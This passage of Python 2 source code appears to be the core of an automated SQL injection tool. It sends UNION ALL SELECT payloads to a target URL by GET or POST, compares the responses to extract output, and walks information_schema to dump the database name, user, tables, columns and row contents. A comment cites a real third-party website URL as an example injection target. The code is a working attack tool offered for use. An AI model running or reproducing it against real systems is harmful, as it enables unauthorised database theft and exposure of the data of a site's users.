                            compare_url = vul_page.replace("$@%#", par + sp + "union" + sp + "all" + sp + "select" + sp+clmn_list+"--" + plus)  # First page for comparison
                            # print "compare url form_mode;", compare_url  # Debugging
                        else:
                            compare_url = vul_page + par + sp + "union" + sp + "all" + sp + "select" + sp + clmn_list+"--" + plus  # First page for comparison
                            # print "compare url without form_mode:", compare_url    # Debugging
                        try:
                            if cookies == "":
                                # print "NO COOKIES"      # DEBUGGING
                                if method == "POST":     # POST Method          # Checking if the method is POST or GET
                                    # print "METHOD POST"     # DEBUGGING
                                    pure_url = vul_page[:vul_page.rfind("?")]             # Extracting the original URL
                                    data_list = compare_url[compare_url.rfind("?")+1:].split("&")
                                    for dl in data_list:                        # Making a dictionary with data for the post request
                                        d_name.append(dl[:dl.find('=')])
                                        d_value.append(dl[dl.find('=')+1:])
                                    data_dict = dict(zip(d_name, d_value))
                                    del d_name[:]                               # Empties the old data
                                    del d_value[:]
                                    compare_html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                                else:
                                    # print "METHOD GET"      # DEBUGGING
                                    compare_html = urllib.urlopen(compare_url).read()
                            else:
                                # print "WITH COOKIES (ERROR BASED)"    # DEBUGGING
                                if method == "POST":     # POST Method          # Checking if the method is POST or GET
                                    # print "METHOD POST (ERROR BASED)"     # DEBUGGING
                                    pure_url = vul_page[:vul_page.rfind("?")]             # Extracting the original URL
                                    data_list = compare_url[compare_url.rfind("?")+1:].split("&")
                                    for dl in data_list:                        # Making a dictionary with data for the post request
                                        d_name.append(dl[:dl.find('=')])
                                        d_value.append(dl[dl.find('=')+1:])
                                    data_dict = dict(zip(d_name, d_value))
                                    del d_name[:]                               # Empties the old data
                                    del d_value[:]
                                    compare_html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                                else:
                                    compare_html = requests.get(compare_url, cookies=cookies_dict).text
                        except:
                            print tm(), wrn, "Injected URL is not stable!!!"
                            print tm(), wrn, "Please make sure you are connected to the internet and try again"
                        # The comma between the columns is also a benchmark so during the iteration the program can
                        # separate the number e.g, 1 from 12 or 11 or 21, which also contains the number 1, and
                        # replaces only the number 1 instead of changing number 11 or 12 or 21
                        temp_clmn1 = ""     # Initiates the variable
                        temp_clmn1 = ","+clmn_list+","      # Adds a comma in front of the column list
                        temp_clmn2 = temp_clmn1.replace(","+clmn_num.__str__()+",", ","+db_payload1+",")   # New list with payload
                        temp_clmn2 = temp_clmn2[1:-1]     # Removes the comma in front of the list
                        if form_mode:
                            union_url = vul_page.replace("$@%#", par+sp+"union"+sp+"all"+sp+"select"+sp+temp_clmn2+db_payload2+"--" + plus)  # Second, injected URL (with payload)
                            print "union url form_mode:", union_url    # Debugging
                        else:
                            union_url = vul_page + par+sp+"union"+sp+"all"+sp+"select"+sp+temp_clmn2+db_payload2+"--" + plus  # Second, injected URL (with payload)
                            print "union url without Form mode:", union_url     # Debugging
                        try:
                            if cookies == "":
                                # print "NO COOKIES"      # DEBUGGING
                                if method == "POST":     # POST Method          # Checking if the method is POST or GET
                                    # print "METHOD POST"     # DEBUGGING
                                    pure_url = vul_page[:vul_page.rfind("?")]             # Extracting the original URL
                                    data_list = union_url[union_url.rfind("?")+1:].split("&")
                                    for dl in data_list:                        # Making a dictionary with data for the post request
                                        d_name.append(dl[:dl.find('=')])
                                        d_value.append(dl[dl.find('=')+1:])
                                    data_dict = dict(zip(d_name, d_value))
                                    del d_name[:]                               # Empties the old data
                                    del d_value[:]
                                    union_html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                                else:
                                    # print "METHOD GET"      # DEBUGGING
                                    union_html = urllib.urlopen(union_url).read()
                            else:
                                # print "WITH COOKIES (ERROR BASED)"    # DEBUGGING
                                if method == "POST":     # POST Method          # Checking if the method is POST or GET
                                    # print "METHOD POST (ERROR BASED)"     # DEBUGGING
                                    pure_url = vul_page[:vul_page.rfind("?")]             # Extracting the original URL
                                    data_list = union_url[union_url.rfind("?")+1:].split("&")
                                    for dl in data_list:                        # Making a dictionary with data for the post request
                                        d_name.append(dl[:dl.find('=')])
                                        d_value.append(dl[dl.find('=')+1:])
                                    data_dict = dict(zip(d_name, d_value))
                                    del d_name[:]                               # Empties the old data
                                    del d_value[:]
                                    union_html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                                else:
                                    union_html = requests.get(union_url, cookies=cookies_dict).text
                        except:
                            print tm(), wrn, "Injected URL is not stable!!!"
                            print tm(), wrn, "Please make sure you are connected to the internet and try again"
                        if "<body" in compare_html: compare_html_body_list = compare_html.split("<body")
                        if "<body" in union_html: union_html_body_list = union_html.split("<body")
                        try: compare_html_body = compare_html_body_list[1]
                        except: compare_html_body = compare_html
                        try: union_html_body = union_html_body_list[1]
                        except: union_html_body = union_html
                        comp_rem_tags = re.sub('<[/A-Za-z0-9]*>', ' !@#$ ', compare_html_body)    # Replacing HTML tags with spaces
                        union_rem_tags = re.sub('<[/A-Za-z0-9]*>', ' !@#$ ', union_html_body)
                        compare_split = comp_rem_tags.split(' !@#$ ')   # splitting on spaces.
                        union_split = union_rem_tags.split(' !@#$ ')
                        compare_set = set(compare_split)   # Creating a set with unique attributes
                        union_set = set(union_split)
                        compare_removed = union_set - compare_set   # Comparing the two set (pages) for differences
                        union_removed = compare_set - union_set     # Needed if the bellow are in use

                        """
                        # Needed when e.g, the results are like "Welcome back John" and not just "John"
                        # Not needed // TODO: Try putting the next two lines in lines
                        # union_split_str = ' '.join(union_split)
                        # union_split_str = re.sub('\s+', ' ', union_split_str)
                        # union_split_spaces = union_split_str.split(' ')

                        # Needed when, see example: http://www.cochraneventilation.com/
                        # articledetails.php?id=-9+union+all+select+1,concat%28id,0x40232340,
                        # table_id,0x40232340,c1,0x40232340,c2,0x40232340,
                        # colspan%29,3,4,5,6,7,8+from+cms_rows+limit+0,1--
                        toremove = ""
                        for cr in compare_removed:
                            cr2 = cr.__str__()
                            if "&nbsp;" in cr2:
                                toremove = cr
                        try:
                            compare_removed.remove(toremove)
                        except:
                            pass
                        """

                        compare_string = ""     # Creating vars to store set as string
                        union_string = ""
                        comm_word = ""
                        for se in compare_removed: compare_string = se      # Creating string with set
                        for se in union_removed: union_string = se
                        compare_split_2 = compare_string.split(' ')   # splitting on spaces.
                        union_split_2 = union_string.split(' ')
                        compare_set_2 = set(compare_split_2)   # Creating a set with unique attributes
                        union_set_2 = set(union_split_2)
                        common_words = union_set_2 & compare_set_2  # Creating one set with common attributes
                        for se in common_words: comm_word += " " + se       # Making the set string
                        comm_word = comm_word.strip()
                        skata = re.sub(comm_word, "", compare_string.strip()).strip()   # Removing the unnecessary words
                        # compare_removed.update([skata])   # Adding the new word to the set || Not needed

                        # Debugging
                        # print "union_split", union_split
                        # print "compare_removed", compare_removed
                        # print "comm_word", comm_word
                        # print "skata", skata

                        for word in union_split:    # Spotting the differences
                            # word = word.strip()
                            if skata == "": skata = "empty!!!"
                            # if "<" in skata or ">" in skata: skata = "empty!!!"
                            # if "<" in word or ">" in word: word = "empty2!!!"
                            # print bcolors.OKGREEN + "Debug:", skata     # Debugging 1
                            # print bcolors.OKBLUE + "Debug:", word.strip()     # Debugging 2
                            tbl_out1 = 0
                            clmn_out1 = 0
                            clinfo_out1 = 0
                            # Warning: If the first payload does not run, then the other ones will never run!!!!!!!!!!
                            if skata in word or fake_diff:
                                # print "YEEEEEEEEEEEEEEEAAAAAAAAAAAAAA!!!!!!!!!!!!!!!"	  # Debugging (if skata and word is the same, then YEA! is printed)
                                word = skata
                                if not fake_diff:   # If a difference has been found
                                    if "<" in word or ">" in word:    # Checking if the difference is useful or not
                                        should_continue = True  # If the difference is not useful, keep searching
                                    if should_continue:     # If the difference is not useful, keep searching
                                        continue
                                    print bcolors.HEADER + "Debug:", word.strip()     # Debugging 3
                                payload_counter += 1

                                # --> Invalid Input parameter like bypass <--
                                # A message is displayed instead of nothing, because the limit is increased and there is no more raws in the column (e.g, Invalid Input parameter when ),
                                # This makes it act like nothing is displayed (like no message is displayed, like fake_diff).
                                words.append(word)
                                try:
                                    if word == words[-2]:   # If the current and the last words are the same (e.g, "Invalid Input parameter")
                                        # For first_info and tables
                                        if payload_counter < 4:
                                            word = words[-3]    # Setting up the word to be the last column name instead of the message.
                                            payload_counter += 1
                                        # For columns
                                        elif payload_counter < 5:     # Only if we have to do with columns
                                            if num < tables.__len__() - 1:  # Check if it has search all the tables in the list or not
                                                if tbl_del == 0:    # Deletes the last column (the "Invalid Input parameter"), from tables list
                                                    del tables[-1]
                                                    tbl_del += 1
                                                try:
                                                    columns[0] = " "    # Delete the first element because it is the name of the table instead of column
                                                except:
                                                    pass
                                                num += 1    # Next table
                                                clmn_limit = set_clmn_lmt   # Just to get inside the if statement
                                                payload_counter = 4
                                                same_word = True
                                                fake_diff = True
                                                last_clmn_remove = True
                                            else:
                                                payload_counter = 5
                                        # For information
                                        elif payload_counter < 6:     # Only if we have to do with information
                                            if tbl_num < tables.__len__() - 1:  # Check if it has search all the tables in the list or not
                                                tbl_num += 1    # Next table
                                                clinfo_limit = set_clinfo_lmt   # Just to get inside the if statement
                                                payload_counter = 5
                                                same_word = True
                                                fake_diff = True
                                                # Debug: print bcolors.FAIL + "Information", concat_string
                                                # Debug: print bcolors.FAIL + "Concat String", concat_string
                                            else:
                                                payload_counter = 6

                                except:
                                    pass

                                if payload_counter == 1:    # Setting up the "user()" payload
                                    db_payload1 = "user()"
                                    first_info.append("DBMS Version: "+word.strip())     # Append versiom in a the list
                                    dbinfo1_found = True
                                elif payload_counter == 2:  # Setting up the "database()" payload
                                    db_payload1 = "database()"  # Na tsekaro pos boro na emfanizo kai tis 2 dbs an iparxoun.
                                    first_info.append("System Username: "+word.strip())     # Append system user name in a the list
                                    dbinfo2_found = True
                                elif payload_counter == 3:  # Setting up the payload for tables
                                    if tbl_limit == set_tbl_lmt:
                                        database_name = word.strip()    # Stores dbname in a variable
                                        first_info.append("Database name: "+word.strip())     # Append dbname in a the list
                                    db_payload1 = "table_name"
                                    try:
                                        db_payload2 = sp+"from"+sp+"information_schema.tables"+sp+"where"+sp+"table_schema=0x"+database_name.encode("hex")+sp+"limit"+sp+tbl_limit.__str__()+",1"
                                    except:
                                        print "You probably have to set a different limit point"
                                        exit()
                                    tbl_limit += 1
                                    payload_counter -= 1
                                    tbl_out1 = 1
                                    tbl_out2 = 1
                                    dbinfo3_found = True
                                elif payload_counter == 4:  # Setting up the payload for columns
                                    db_payload1 = "column_name"
                                    try:
                                        db_payload2 = sp+"from"+sp+"information_schema.columns"+sp+"where"+sp+"table_name=0x"+tables[num].encode("hex")+sp+"and"+sp+"table_schema=0x"+tables[0].encode("hex")+sp+"limit"+sp+clmn_limit.__str__()+",1"
                                    except:
                                        print "You probably have to set a different limit point"
                                        exit()
                                    clmn_limit += 1
                                    payload_counter -= 1
                                    clmn_out1 = 1
                                    clmn_out2 = 1
                                    dbinfo4_found = True
                                elif payload_counter == 5:  # Setting up the payload for columns information
                                    # Only the first time
                                    if last_clmn_remove:    # Remove the last column if there is a message like (Invalid Input parameter)
                                        del columns[-1]
                                        del columns_forinfo[-1]
                                        last_clmn_remove = False
                                        same_word = False   # Makes it False because it was True since last time and this is a good point to makes it False because it gets in only one time, the first.
                                    if not search_columns:  # Ends the program without searching for information
                                        payload_counter = 100
                                        break
                                    # Only the first time
                                    if clinfo_limit == set_clinfo_lmt and not tbl_changed2:     # No table has changed (message is not displayed, blank page)
                                        if not same_word:       # No table has changed (message is displayed)
                                            first_time = True
                                            columns_forinfo.pop(0)  # Removes the first ' ' from the list
                                    if tbl_changed2 and not same_word:  # Table has changed (blank page )
                                        column_info.append(" ")
                                        concat_string = ""
                                    if same_word:   # Table has changed (massage is displayed), Replaces the massage with a space to define the change of the table
                                        column_info[-1] = " "
                                        concat_string = ""
                                    if tbl_changed2 or first_time or same_word:     # Creating the new list with column names after table has changed
                                        for col in columns_forinfo:
                                            rem_clmn += 1
                                            if col == " ":
                                                del columns_forinfo[0:rem_clmn]
                                                rem_clmn = 0
                                                break
                                            concat_string = concat_string+col+",0x40232340,"
                                        concat_string = concat_string[:-12]     # removes the last ",0x40232340," from the list
                                        same_word = False
                                    if result_limit:    # Setting up a limit for columns information results
                                        if set_clinfo_lmt == 0:
                                            if clinfo_limit > 2:
                                                clinfo_limit = 1000000
                                        if set_clinfo_lmt == 1:
                                            if clinfo_limit > 3:
                                                clinfo_limit = 1000000
                                    db_payload1 = "concat("+concat_string+")"
                                    try:
                                        db_payload2 = sp+"from"+sp+tables[tbl_num]+sp+"limit"+sp+clinfo_limit.__str__()+",1"
                                    except:
                                        print "You probably have to set a different limit point"
                                        exit()
                                    if not fake_diff:
                                        if not first_time:
                                            column_info.append(word.strip())
                                    payload_counter -= 1
                                    clinfo_limit += 1
                                    clinfo_out1 = 1
                                    clinfo_out2 = 1
                                    first_time = False
                                    dbinfo5_found = True
                                else:                       # Exiting loop
                                    dbinfo_exit = True
                                    break
                                break
                        # Those if statements are to start the column list from the beginning by breaking the for loop
                        if dbinfo1_found:   # To Continue with the next (user()) payload
                            should_restart = True
                            break
                        if dbinfo2_found:    # To Continue with the next (database()) payload
                            should_restart = True
                            break
                        if dbinfo3_found:    # To keep searching for more tables
                            tables.append(word.strip())     # Append table names in the list
                            should_restart = True
                            break
                        if tbl_out1 == 0 and tbl_out2 == 1 and loop_counter == column_num:   # To continue with the next (column) payload
                            tbl_out2 = 0
                            payload_counter = 3
                            fake_diff = True
                            should_restart = True
                            break
                        if dbinfo4_found:   # To keep searching for more columns
                            if not fake_diff:
                                columns.append(word.strip())     # Append column names in the list
                                columns_forinfo.append(word.strip())
                            else:
                                if tbl_changed1:
                                    columns.append(" ")     # Append a space to define the change of the table
                                    columns_forinfo.append(" ")
                                if same_word:   # Replace the massage with a space to define the change of the table
                                    columns[-1] = " "
                                    columns_forinfo[-1] = " "
                            tbl_changed1 = False
                            fake_diff = False
                            should_restart = True
                            break
                        if clmn_out1 == 0 and clmn_out2 == 1 and loop_counter == column_num:    # To continue with the next payload
                            if num < tables.__len__() - 1:  # Increasing num until it finds all the tables
                                num += 1
                                tbl_changed1 = True
                                clmn_limit = set_clmn_lmt
                                payload_counter = 3
                            else:
                                payload_counter = 4
                            clmn_out2 = 0
                            fake_diff = True
                            should_restart = True
                            break
                        if dbinfo5_found:
                            tbl_changed2 = False
                            fake_diff = False
                            should_restart = True
                            break
                        if clinfo_out1 == 0 and clinfo_out2 == 1 and loop_counter == column_num:    # To continue with the next payload
                            if tbl_num < tables.__len__() - 1:
                                tbl_changed2 = True
                                tbl_num += 1
                                clinfo_limit = set_clinfo_lmt
                                payload_counter = 4
                            else:
                                payload_counter = 5
                            clinfo_out2 = 0
                            fake_diff = True
                            should_restart = True
                        if dbinfo_exit:     # Exiting the loop
                            break
                    proggress = ""
                    # time.sleep(10) Prepei na thimitho gia pio logo to evala
                if payload_counter == 0:    # If for any reason it can't find any information
                    print tm(), wrn, "Detected security measures!"
                    print tm(), inf, "We couldn't find any information about the database."
                    # print "Do you want to try bypass methods? [y/N]: "
                else:                       # Printing the information
                    rem_el = 0  # Counts the columns to be removed
                    num = 1     # Counts the tables
                    list_counter = 0
                    print "\n\n+--------------------------------------------+"
                    for f_inf in first_info:    # Printing information like (DataBase name, UserName, System Version...)
                        print f_inf
                    print "+--------------------------------------------+"
                    for clmns in columns:
                        if clmns == " ":    # Changing table
                            print ""
                            print "+--------------------+"
                            try:
                                print bcolors.BOLD + bcolors.HEADER + tables[num] + bcolors.ENDC    # Printing table name
                            except:
                                pass
                            print "+--------------------+"
                            del column_info[0:rem_el]   # Removing the columns of the previous table
                            rem_el = 0      # Reinitializing
                            list_counter = 0
                            num += 1
                        else:               # Displaying Info (columns and columns data)
                            print ""
                            print bcolors.BOLD + bcolors.OKBLUE + clmns + bcolors.ENDC          # Printing column name
                            rem_el = 0
                            for clinfos in column_info:
                                rem_el += 1
                                if clinfos == " ":  # Changing column
                                    break
                                else:               # Displaying Info
                                    new_list = clinfos.split("@##@")
                                    try:
                                        print new_list[list_counter]    # Printing columns data
                                    except:
                                        pass
                            list_counter += 1
                    # Edo tha mpoune oi methodoi gia bypass, px, an den mporese na vrei plirofories me aplo UNION
                    # tote tha synexisei me kapoia methodo pou tha kanei bypass (px, Double Query) kai outokathexeis
    print "\n\nFinished successfully!!!"
    print "=================================================="
